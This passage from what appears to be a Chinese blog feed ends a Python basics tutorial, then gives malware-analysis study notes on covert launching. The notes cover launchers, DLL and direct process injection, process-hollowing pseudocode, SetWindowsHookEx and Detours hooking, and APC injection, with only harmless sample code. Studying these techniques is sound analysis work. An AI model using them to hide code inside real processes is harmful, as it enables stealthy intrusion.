命名规范</h3><ul><li>命名要具有描述性；</li><li>必须以字母或下划线开头，且只能是下划线、字母和数字的组合；</li><li>不能使用Python的关键字，也称保留字；</li><li>命名是区分大小写的；</li><li>模块中以下划线开头的名字是模块私有的；</li><li>以双下划线开头的类成员名字是类私有的；</li><li>同时以双下划线开头和结尾的名字，叫做特殊方法，也叫双下方法或魔术方法；</li><li>推荐使用驼峰命名法或下划线命名法；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">// 驼峰命名法<br>myFirstVarable = <span class="hljs-number">100</span><br>// 下划线命名法<br>my_first_varable = <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h1 id="变量">2. 变量</h1><h2 id="保留字与标识符">2.1 保留字与标识符</h2><h3 id="保留字">2.1.1 保留字</h3><p>保留字也称关键字，不能用于命名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> keyword<br><span class="hljs-built_in">print</span>(keyword.kwlist)<br><br><span class="hljs-comment"># 运行结果</span><br>[<span class="hljs-string">&#x27;False&#x27;</span>, <span class="hljs-string">&#x27;None&#x27;</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;as&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;async&#x27;</span>, <span class="hljs-string">&#x27;await&#x27;</span>, <span class="hljs-string">&#x27;break&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;continue&#x27;</span>, <span class="hljs-string">&#x27;def&#x27;</span>, <span class="hljs-string">&#x27;del&#x27;</span>, <span class="hljs-string">&#x27;elif&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;except&#x27;</span>, <span class="hljs-string">&#x27;finally&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-string">&#x27;is&#x27;</span>, <span class="hljs-string">&#x27;lambda&#x27;</span>, <span class="hljs-string">&#x27;nonlocal&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;pass&#x27;</span>, <span class="hljs-string">&#x27;raise&#x27;</span>, <span class="hljs-string">&#x27;return&#x27;</span>, <span class="hljs-string">&#x27;try&#x27;</span>, <span class="hljs-string">&#x27;while&#x27;</span>, <span class="hljs-string">&#x27;with&#x27;</span>, <span class="hljs-string">&#x27;yield&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="标识符">2.1.2 标识符</h3><p>标识符是Python中的一种符号，用于表示变量名、方法名、类名等。</p><h2 id="理解变量">2.2 理解变量</h2><p>变量是存放数据值的容器。与其他编程语言不同，Python没有声明变量的命令。首次为其赋值时，才会创建变量。</p><h2 id="创建变量">2.3 创建变量</h2><p>变量不需要使用任何特定类型声明，甚至可以在设置后更改其类型。字符串变量可以使用单引号或双引号进行声明。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">5</span> <span class="hljs-comment"># x is of type int</span><br>x = <span class="hljs-string">&quot;Steve&quot;</span> <span class="hljs-comment"># x is now of type str</span><br>x, y, z = <span class="hljs-string">&quot;Orange&quot;</span>, <span class="hljs-string">&quot;Banana&quot;</span>, <span class="hljs-string">&quot;Cherry&quot;</span><br></code></pre></td></tr></table></figure><h1 id="基本数据类型">3. 基本数据类型</h1><ol type="1"><li><strong>整数（int）</strong>：用于表示整数值，例如：<code>5</code>,<code>-10</code>, <code>1000</code>。</li><li><strong>浮点数（float）</strong>：用于表示带有小数点的数字，例如：<code>3.14</code>,<code>2.71828</code>, <code>-0.01</code>。</li><li><strong>字符串（str）</strong>：用于表示文本数据，用单引号或双引号括起来，例如：<code>'Hello'</code>,<code>"Python"</code>, <code>'123'</code>。</li><li><strong>布尔值（bool）</strong>：表示真（True）或假（False）的值，用于逻辑运算和条件判断。</li><li><strong>None类型</strong>：表示空值或缺失值，在Python中常用于表示空对象或变量。</li></ol><h1 id="数据类型转换">4. 数据类型转换</h1><ol type="1"><li><p><strong>int()</strong>：将一个值转换为整数类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-built_in">int</span>(<span class="hljs-number">5.6</span>)  <span class="hljs-comment"># x 将变成整数 5</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>float()</strong>：将一个值转换为浮点数类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-built_in">float</span>(<span class="hljs-string">&quot;3.14&quot;</span>)  <span class="hljs-comment"># y 将变成浮点数 3.14</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>str()</strong>：将一个值转换为字符串类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">z = <span class="hljs-built_in">str</span>(<span class="hljs-number">100</span>)  <span class="hljs-comment"># z 将变成字符串 &quot;100&quot;</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>bool()</strong>：将一个值转换为布尔类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">bool</span>(<span class="hljs-number">0</span>)  <span class="hljs-comment"># a 将变成布尔值 False</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>list()</strong>：将其他数据类型转换为列表类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-built_in">list</span>((<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))  <span class="hljs-comment"># b 将变成列表 [1, 2, 3]</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>tuple()</strong>：将其他数据类型转换为元组类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-built_in">tuple</span>([<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])  <span class="hljs-comment"># c 将变成元组 (4, 5, 6)</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>dict()</strong>：将其他数据类型转换为字典类型。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">d = <span class="hljs-built_in">dict</span>([(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;one&#x27;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;two&#x27;</span>)])  <span class="hljs-comment"># d 将变成字典 &#123;1: &#x27;one&#x27;, 2: &#x27;two&#x27;&#125;</span><br></code></pre></td></tr></table></figure></p></li></ol><h1 id="基本输入和输出">5. 基本输入和输出</h1><h2 id="输入input">5.1 输入（Input）</h2><p>使用 <code>input()</code>函数获取用户的输入，该函数会返回一个字符串类型的值。你可以在括号内添加一条提示消息，让用户知道他们需要输入什么样的信息。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入您的姓名：&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;您好，&quot;</span> + name + <span class="hljs-string">&quot;!&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="输出output">5.2 输出（Output）</h2><p>使用 <code>print()</code> 函数将信息输出到控制台。你可以向<code>print()</code>函数传递一个或多个参数，在输出时它们会以空格分隔，默认情况下在输出结束时会自动换行。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">age = <span class="hljs-number">25</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;您的年龄是:&quot;</span>, age)<br></code></pre></td></tr></table></figure><p>此外，<code>print()</code> 函数还有一些参数可以调整输出的方式： -<code>end</code> 参数：指定输出结束时的字符，默认是换行符<code>\n</code>。 - <code>sep</code>参数：指定多个要打印的内容之间的分隔符，默认是空格。</p><p>例如： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>, sep=<span class="hljs-string">&quot;-&quot;</span>)  <span class="hljs-comment"># 输出：Hello-world</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello&quot;</span>, end=<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;world&quot;</span>)  <span class="hljs-comment"># 输出：Hello world（在同一行）</span><br></code></pre></td></tr></table></figure></p><p><strong>参考资料：</strong></p><ol type="1"><li><ahref="https://cg-td-course.readthedocs.io/zh-cn/latest/p_Python/python_name_rules.html">Python命名规则</a></li><li><ahref="https://www.w3school.com.cn/python/python_variables.asp">Python变量</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH07-隐蔽的恶意代码启动</title>
    <link href="/2023/11/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH07%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/"/>
    <url>/2023/11/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH07%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="启动器launcher">1. 启动器(Launcher)</h1><ul><li>定义：也称为加载器，用来启动其他恶意程序的恶意代码。通常情况下，启动器使用一些非传统的技术，来启动其他恶意程序。</li><li>目的：使恶意行为对用户隐藏；可能包含提权代码，以更高权限访问系统。</li><li>启动器经常包含它要加载的恶意代码。最常见的情况是在它的资源节中包含一个可执行文件或DLL。</li><li>常用资源操作API函数：<code>FindResource</code>、<code>LoadResource</code>、<code>SizeofResource</code>。</li></ul><h1 id="进程注入">2. 进程注入</h1><ul><li>定义：这种技术是将代码注入到<strong>另外一个正在运行</strong>的进程中，而被注入的进程会不知不觉地运行注入的代码。</li><li>常用函数：<ul><li>VirtualAllocEx：在指定进程中分配一块内存空间</li><li>WriteProcessMemory：此函数能向VirtualAllocEx函数分配的地址空间写数据</li></ul></li></ul><h2 id="dll注入">2.1 DLL注入</h2><p><strong>定义：</strong></p><ul><li>DLL注入是进程注入的一种形式，它强迫一个远程进程加载恶意DLL程序，同时它是最常用的秘密加载技术。</li><li>所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。</li></ul><p><strong>基本思路：</strong></p><p>调用<code>CreateRemoteThread</code>(三个重要参数：进程句柄、注入线程入口点、线程参数)时，线程入口点设置为LoadLibrary函数的地址，并且恶意DLL名字作为它的参数。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291622584.png"alt="image-20231129150545065" /><figcaption aria-hidden="true">image-20231129150545065</figcaption></figure><p><strong>实现过程：</strong></p><ul><li>FindWindow( )、GetWindowThreadProcessId( )/CreateToolhelp32Snapshot( )，Process32First( )和Process32Next()这两组函数就是为了获得目标进程的ID，OpenProcess()这个API实现打开进程。</li><li>VirtualAllocEx( )向“宿主进程”申请内存。</li><li>WriteProcessMemory()把特定的数据（恶意DLL模块或恶意代码）写进“目标进程”。<br /></li><li>GetProcAddress()检索指定的动态链接库(DLL)中的输出库函数（LoadLibrary）地址。LoadLibrary()是加载DLL文件的必备API。</li><li>CreateRemoteThread( )或者NtCreateThreadEx ( )或RtlCreateUserThread () ，这个API强制在宿主进程里面新建一个线程。</li><li>WaitForSingleObject( )、VirtualFreeEx( )、CloseHandle()等待与清理。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291622585.png"alt="image-20231129150624799" /><figcaption aria-hidden="true">image-20231129150624799</figcaption></figure><p>参考教程：<ahref="https://www.cnblogs.com/Xy--1/p/14506866.html">DLL进程注入之CreateRemoteThread()</a></p><h2 id="直接注入">2.2 直接注入</h2><p><strong>相同点：</strong></p><p>同DLL注入一样，在远程进程的内存空间中分配和插入代码，使用类似的Windows函数。</p><p><strong>不同点：</strong></p><p>不单独编写DLL，直接将恶意代码注入到远程进程中，比DLL注入更加灵活。</p><p><strong>特点：</strong></p><ul><li>需要大量的定制代码</li><li>通常用来注入shellcode</li><li>两次VirtualAllocEx()和WriteProcessMemory()：第一次分配内容空间并写入数据；第二次分配内存空间并写入代码。</li><li>要求精通汇编语言，或编写简单的shellcode</li></ul><p>参考教程：<ahref="https://xz.aliyun.com/t/11933">进程注入：通过远程线程注入代码</a></p><h1 id="进程替换">3. 进程替换</h1><p><strong>定义：</strong></p><p>进程替换是指将正在运行的程序的内存空间用恶意代码替换掉。如果被替换的进程是合法的进程,那么恶意代码可以披着合法的外衣干坏事。</p><p><strong>关键点：</strong></p><p>以挂起状态创建一个进程。CreateProcess以CREATE_SUSPENDED方式调用。</p><p><strong>进程替换过程：</strong></p><ul><li>创建一个挂起状态的进程, 此时进程的主线程还未开始运行；</li><li>读取主线程的上下文, 并读取新创建进程的基址；</li><li>使用ZwUnmapViewOfSection/NtUnmapViewOfSection将新创建的进程的内存空间释放掉,随后可以开始填充恶意代码；</li><li>用VirtualAllocEx在子进程指定的基址分配空间，调用ReadProcessMemory和WriteProcessMemory来读写子进程空间的内容，调用VirtualProtectEx修改内存的属性为可读可写可执行；</li><li>设置主线程的上下文, 启动主线程。</li></ul><p><strong>伪代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">CreateProcess(cAppName, ....., CREATE_SUSPENDED, .....);<span class="hljs-comment">//创建挂起进程</span><br>ZwUnmapViewOfSection（....）;                      <span class="hljs-comment">//释放内存</span><br>VirtualAllocEx(...,ImageBase,SizeOfImge....); <span class="hljs-comment">//为恶意代码分配新的内存</span><br>WriteProcessMemory（...headers,...）;          <span class="hljs-comment">//将恶意代码每个段写入进程空间</span><br><span class="hljs-keyword">for</span> &#123;WriteProcessMemory ();&#125;<br>SetThreadContext();                                        <span class="hljs-comment">//入口点指向恶意代码</span><br>....<br>ResumeThread();                                             <span class="hljs-comment">//执行</span><br></code></pre></td></tr></table></figure><h1 id="钩子hook注入">4. 钩子(Hook)注入</h1><ul><li><p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。钩子机制允许应用程序截获处理Window消息或特定事件。</p></li><li><p>钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p></li><li><p>没有使用钩子注入和使用钩子注入的Windows事件和消息流：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291622586.png"alt="image-20231129153220073" /><figcaption aria-hidden="true">image-20231129153220073</figcaption></figure></li></ul><h2 id="钩子的分类">4.1 钩子的分类</h2><p><strong>按使用范围分类：</strong></p><ul><li>系统钩子（全局钩子）<ul><li>监视系统中的所有线程的事件消息。</li><li>会影响系统中所有应用程序，钩子函数必须放在独立的动态链接库(DLL)中。</li><li>系统自动将包含“钩子回调函数”的DLL映射到受钩子函数影响的所有进程的地址空间中，即将这个DLL注入到那些进程。</li></ul></li><li>线程钩子（局部钩子）<ul><li>用于监视指定线程的事件消息。</li><li>一般在当前线程或者当前线程派生的线程内。</li></ul></li></ul><p><strong>按事件分类：</strong></p><ul><li>键盘钩子和低级键盘钩子可以监视各种键盘消息。</li><li>鼠标钩子和低级鼠标钩子可以监视各种鼠标消息。</li><li>外壳钩子可以监视各种Shell事件消息。比如：启动和关闭应用程序。</li><li>日志钩子可以记录从系统消息队列中取出的各种事件消息。</li><li>窗口过程钩子监视所有从系统消息队列发往目标窗口的消息。</li><li>还有一些特定事件的钩子。</li></ul><h2 id="系统钩子和线程钩子">4.2 系统钩子和线程钩子</h2><ul><li>SetWindowsHookEx()函数的最后一个参数，决定此钩子是系统钩子还是线程钩子。</li><li>如果对同一事件（如鼠标消息）既安装线程钩子又安装系统钩子，那么系统会自动先调用线程钩子，然后调用系统钩子。</li><li>对同一事件消息可安装多个钩子处理过程，这些钩子处理过程形成钩子链。当前钩子处理结束后，应把钩子信息传递给下一个钩子函数。</li><li>钩子特别是系统钩子会消耗消息处理时间，降低系统性能。只有在必要的时候才安装钩子，在使用完毕后要及时卸载。</li></ul><h2 id="使用钩子的键盘记录器">4.3 使用钩子的键盘记录器</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291622587.png"alt="image-20231129154600740" /><figcaption aria-hidden="true">image-20231129154600740</figcaption></figure><h2 id="使用setwindowshookex">4.4 使用SetWindowsHookEx</h2><p><strong>功能：</strong>该函数将一个应用程序定义的挂钩处理过程安装到挂钩链中，可以通过安装挂钩处理过程来对系统的某些类型事件进行监控，这些事件与某个特定的线程或系统中的所有事件相关。</p><p><strong>函数原型：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">( </span><br><span class="hljs-params">__in <span class="hljs-type">int</span> idHook,    \\钩子类型 </span><br><span class="hljs-params">__in HOOKPROC lpfn,    \\回调函数地址</span><br><span class="hljs-params">__in HINSTANCE hMod,       \\实例句柄 </span><br><span class="hljs-params">__in DWORD dwThreadId      \\线程ID </span><br><span class="hljs-params">)</span>; <br><br>LRESULT WINAPI <span class="hljs-title function_">CallNextHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_opt_ HHOOK hhk，　　　　　　　　　　\\ 保存的钩子过程,也就是SetWindowsHookEx返回值.</span><br><span class="hljs-params">  _In_      <span class="hljs-type">int</span>     nCode，            \\ 根据SetWindowsHookEx设置的钩子回调而产生的不同的nCode代码.</span><br><span class="hljs-params">      \\如果设置的钩子类型是鼠标消息.那么那个nCode就是鼠标消息.如果是键盘这是键盘</span><br><span class="hljs-params">  _In_ WPARAM wParam，                 \\ 同<span class="hljs-number">2</span>参数一样.附加参数. 根据钩子回调类型.附加参数有不同的意义.</span><br><span class="hljs-params">  _In_ LPARAM lParam                   \\ 同<span class="hljs-number">3</span>参数一样.附加参数.</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>idHook：指示欲被安装的挂钩处理过程的类型。（14种）</li><li>lpfn：指向相应的挂钩处理过程。若参数dwThreadId为0或者指示一个其他进程创建的线程的标识符，则参数lpfn必须指向一个动态链接中的挂钩处理过程。否则，参数lpfn可以指向一个与当前进程相关的代码中定义的挂钩处理过程。</li><li>hMod：指示一个动态链接的句柄，该动态链接库包含参数lpfn所指向的挂钩处理过程。若参数dwThreadId指示的线程由当前进程创建，并且相应的挂钩处理过程定义于当前进程相关的代码中，则参数hMod必须被设置为NULL(0)。</li><li>dwThreadId：指示一个线程标识符，挂钩处理过程与线程相关（线程钩子）。若此参数值为0，则该挂钩处理过程与所有现存的线程相关。（系统钩子）</li></ul><p><strong>键盘钩子（keyboard hook）的示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// HHOOK 是一个钩子句柄的类型定义</span><br>HHOOK keyboardHook, hhook;<br><br><span class="hljs-comment">// 键盘处理回调函数</span><br>LRESULT CALLBACK <span class="hljs-title function_">KeyboardProc</span><span class="hljs-params">(_In_ <span class="hljs-type">int</span> code, _In_ WPARAM wParam, _In_ LPARAM lParam)</span><br>&#123;<br>    <span class="hljs-comment">// 在按键事件发生时弹出一个消息框</span><br>    ::MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;按键了&quot;</span>, <span class="hljs-string">L&quot;caption&quot;</span>, <span class="hljs-number">0x00000002</span>L);<br><br>    <span class="hljs-comment">// 调用下一个钩子程序（传递事件到下一个处理程序）</span><br>    <span class="hljs-keyword">return</span> CallNextHookEx(keyboardHook, code, wParam, lParam);<br>&#125;<br><br><span class="hljs-comment">// 设置键盘钩子的函数,需要Hook的线程ID</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setHook</span><span class="hljs-params">(DWORD threadId)</span><br>&#123;<br>    <span class="hljs-comment">// 在其他进程中设置键盘钩子，使用KeyboardProc作为回调函数，该函数在“mydll.dll”中实现</span><br>    keyboardHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(<span class="hljs-string">L&quot;mydll.dll&quot;</span>), threadId);<br><br>    <span class="hljs-comment">// 在当前进程中设置键盘钩子，同样使用KeyboardProc作为回调函数</span><br>    hhook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, <span class="hljs-literal">NULL</span>, threadId);<br>&#125;<br></code></pre></td></tr></table></figure><p>参考教程：<ahref="https://cloud.tencent.com/developer/article/1199648">SetWindowsHookEx全局钩子注入</a></p><h1 id="detours">5. Detours</h1><ul><li>Detours是一个在x86、x64、IA64和ARM64平台上截获任意API函数调用的工具库。</li><li>Detours使用一个无条件转移指令来替换目标函数的最初几条指令，将控制流转移到一个用户提供的截获函数。</li><li>目标函数中的一些指令被保存在一个被称为“trampoline”的函数中。</li><li>这些指令包括目标函数中被替换的代码，以及一个重新跳转到目标函数的无条件分支。而截获函数可以替换目标函数，或者通过执行“trampoline”函数的时候，将目标函数作为子程序来调用的办法来扩展功能。</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;detours.h&quot;</span> <span class="hljs-comment">// 引入Detours库头文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;detours.lib&quot;</span>)  </span><br><br><span class="hljs-comment">// 定义原始MessageBoxW函数指针，用于保存原始函数地址</span><br><span class="hljs-type">static</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(WINAPI *OldMessageBoxW)</span><span class="hljs-params">(</span><br><span class="hljs-params">    HWND hWnd,</span><br><span class="hljs-params">    LPCWSTR lpText,</span><br><span class="hljs-params">    LPCWSTR lpCaption,</span><br><span class="hljs-params">    UINT uType)</span> = MessageBoxW;<br><br><span class="hljs-comment">// 新的MessageBoxW函数，用于替换原始函数</span><br><span class="hljs-type">int</span> WINAPI <span class="hljs-title function_">NewMessageBoxW</span><span class="hljs-params">(</span><br><span class="hljs-params">    HWND hWnd,</span><br><span class="hljs-params">    LPCWSTR lpText,</span><br><span class="hljs-params">    LPCWSTR lpCaption,</span><br><span class="hljs-params">    UINT uType)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 替换为返回0的新MessageBoxW函数</span><br>&#125;<br><br><span class="hljs-comment">// Hook函数，用于替换原始函数为新函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hook</span><span class="hljs-params">()</span> &#123;<br>    DetourRestoreAfterWith(); <span class="hljs-comment">// 设置Detours恢复选项</span><br>    DetourTransactionBegin(); <span class="hljs-comment">// 开始Hook事务</span><br>    DetourUpdateThread(GetCurrentThread()); <span class="hljs-comment">// 更新当前线程的Hook信息</span><br>    DetourAttach((<span class="hljs-type">void</span> **)&amp;OldMessageBoxW, NewMessageBoxW); <span class="hljs-comment">// 将MessageBoxW函数替换为NewMessageBoxW函数</span><br>    DetourTransactionCommit(); <span class="hljs-comment">// 提交Hook事务</span><br>&#125;<br><br><span class="hljs-comment">// UnHook函数，用于还原原始函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">UnHook</span><span class="hljs-params">()</span> &#123;<br>    DetourTransactionBegin(); <span class="hljs-comment">// 开始UnHook事务</span><br>    DetourUpdateThread(GetCurrentThread()); <span class="hljs-comment">// 更新当前线程的UnHook信息</span><br>    DetourDetach((<span class="hljs-type">void</span> **)&amp;OldMessageBoxW, NewMessageBoxW); <span class="hljs-comment">// 将NewMessageBoxW函数还原为MessageBoxW函数</span><br>    DetourTransactionCommit(); <span class="hljs-comment">// 提交UnHook事务</span><br>&#125;<br><br><span class="hljs-comment">// 主函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    MessageBoxW(<span class="hljs-number">0</span>, <span class="hljs-string">L&quot;abcd&quot;</span>, <span class="hljs-string">L&quot;test&quot;</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 调用原始MessageBoxW函数</span><br>    Hook(); <span class="hljs-comment">// 执行Hook操作，替换MessageBoxW函数为NewMessageBoxW函数</span><br>    MessageBoxW(<span class="hljs-number">0</span>, <span class="hljs-string">L&quot;1234&quot;</span>, <span class="hljs-string">L&quot;test&quot;</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 调用被替换的NewMessageBoxW函数</span><br>    UnHook(); <span class="hljs-comment">// 执行UnHook操作，还原MessageBoxW函数为原始函数</span><br>    system(<span class="hljs-string">&quot;pause&quot;</span>); <span class="hljs-comment">// 暂停命令行，等待用户输入</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="apc注入">6. APC注入</h1><ul><li>APC：异步过程调用</li><li>APC模式：内核模式、用户模式</li><li>APC注入的原理：是利用当线程被唤醒时，APC中的注册函数会被执行的机制，并以此去执行DLL加载代码，进而完成DLL注入的目的。</li></ul><h2 id="用户模式apc注入">6.1 用户模式APC注入</h2><ul><li>当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断。</li><li>当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</li><li>利用QueueUserAPC()这个API可以在软中断时，向线程的APC队列插入一个函数指针，如果插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</li></ul><h2 